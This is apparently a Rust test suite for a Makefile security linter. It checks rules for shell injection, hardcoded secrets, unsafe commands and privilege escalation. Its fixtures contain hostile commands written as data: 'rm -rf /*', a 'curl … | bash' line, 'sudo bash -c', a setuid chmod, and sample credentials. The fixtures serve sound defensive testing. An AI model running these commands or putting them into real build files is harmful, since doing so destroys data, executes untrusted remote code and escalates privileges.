#[test]
fn test_shell_injection_detection() {
    let content = r#"target:
	rm -rf $(USER_INPUT)
	echo "$(SAFE_VAR)"
"#;
    let mut parser = MakefileParser::new(content);
    let ast = parser.parse().expect("internal error");

    let rule = ShellInjectionRule;
    let violations = rule.check(&ast);

    assert_eq!(violations.len(), 1);
    assert!(violations[0].message.contains("shell injection"));
}

/// RED TEST: Properly quoted Make variables with $${VAR} should NOT trigger warnings
#[test]
fn test_make_escaped_variables_are_safe() {
    let content = r#"test:
	@output="$$(./tool run)"; \
	echo "$${output}" | head -n 5; \
	issues="$$(echo "$${output}" | grep -c "error" || true)"
"#;
    let mut parser = MakefileParser::new(content);
    let ast = parser.parse().expect("internal error");

    let rule = ShellInjectionRule;
    let violations = rule.check(&ast);

    // MUST be zero - these are properly quoted Make variables
    assert_eq!(
        violations.len(),
        0,
        "Properly quoted Make variables ${{VAR}} should not trigger shell injection warnings"
    );
}

/// RED TEST: Quoted $(VAR) in dangerous commands should be SAFE
#[test]
fn test_quoted_command_substitution_is_safe() {
    let content = r#"dangerous:
	find "$(SCRIPTS_DIR)" -name '*.test.ts'
	rm -rf "$(BUILD_DIR)"
"#;
    let mut parser = MakefileParser::new(content);
    let ast = parser.parse().expect("internal error");

    let rule = ShellInjectionRule;
    let violations = rule.check(&ast);

    assert_eq!(
        violations.len(),
        0,
        "Quoted $(VAR) in dangerous commands should not trigger warnings"
    );
}

/// PROPERTY TEST: Any command with "$${" should NEVER trigger shell injection
#[test]
fn property_test_double_dollar_brace_always_safe() {
    let test_cases = [
        r#"echo "$${foo}""#,
        r#"echo "$${output}" | grep test"#,
        r#"rm -rf "$${tmpdir}""#,
        r#"find "$${path}" -name '*.rs'"#,
        r#"curl "$${url}" -o file"#,
    ];

    for (i, cmd) in test_cases.iter().enumerate() {
        let content = format!("test:\n\t{}\n", cmd);
        let mut parser = MakefileParser::new(&content);
        let ast = parser.parse().expect("internal error");

        let rule = ShellInjectionRule;
        let violations = rule.check(&ast);

        assert_eq!(
            violations.len(),
            0,
            "Test case {}: Command with ${{{{...}}}} should not trigger: {}",
            i,
            cmd
        );
    }
}

/// PROPERTY TEST: Any command with "$$(" should NEVER trigger shell injection
#[test]
fn property_test_double_dollar_paren_always_safe() {
    let test_cases = [
        r#"output="$$(ls)""#,
        r#"count="$$(echo "$${var}" | wc -l)""#,
        r#"rm -rf "$$(pwd)/tmp""#,
        r#"tar xzf "$$(find . -name '*.tar.gz')""#,
    ];

    for (i, cmd) in test_cases.iter().enumerate() {
        let content = format!("test:\n\t{}\n", cmd);
        let mut parser = MakefileParser::new(&content);
        let ast = parser.parse().expect("internal error");

        let rule = ShellInjectionRule;
        let violations = rule.check(&ast);

        assert_eq!(
            violations.len(),
            0,
            "Test case {}: Command with $$((...)) should not trigger: {}",
            i,
            cmd
        );
    }
}

/// MUTATION TEST: Unquoted variables MUST still trigger (regression check)
#[test]
fn mutation_test_unquoted_vars_still_detected() {
    let content = r#"dangerous:
	rm -rf $(UNQUOTED_VAR)
	find $(SOME_PATH) -name '*.tmp'
"#;
    let mut parser = MakefileParser::new(content);
    let ast = parser.parse().expect("internal error");

    let rule = ShellInjectionRule;
    let violations = rule.check(&ast);

    assert!(
        !violations.is_empty(),
        "Unquoted variables in dangerous commands MUST still be detected"
    );
}

#[test]
fn test_sensitive_data_detection() {
    let content = r#"
AWS_ACCESS_KEY = AKIAIOSFODNN7EXAMPLE
DB_PASSWORD = admin123
SAFE_VAR = $${PASSWORD}
"#;
    let mut parser = MakefileParser::new(content);
    let ast = parser.parse().expect("internal error");

    let rule = SensitiveDataRule;
    let violations = rule.check(&ast);

    assert_eq!(violations.len(), 2);
}

#[test]
fn test_unsafe_command_detection() {
    let content = r#"clean:
	rm -rf /*
	curl http://example.com | bash
"#;
    let mut parser = MakefileParser::new(content);
    let ast = parser.parse().expect("internal error");

    let rule = UnsafeCommandRule;
    let violations = rule.check(&ast);

    assert_eq!(violations.len(), 2);
}

#[test]
fn test_privilege_escalation_detection() {
    let content = r#"install:
	sudo bash -c "$(CMD)"
	chmod +s binary
"#;
    let mut parser = MakefileParser::new(content);
    let ast = parser.parse().expect("internal error");

    let rule = PrivilegeEscalationRule;
    let violations = rule.check(&ast);

    assert_eq!(violations.len(), 2);
}
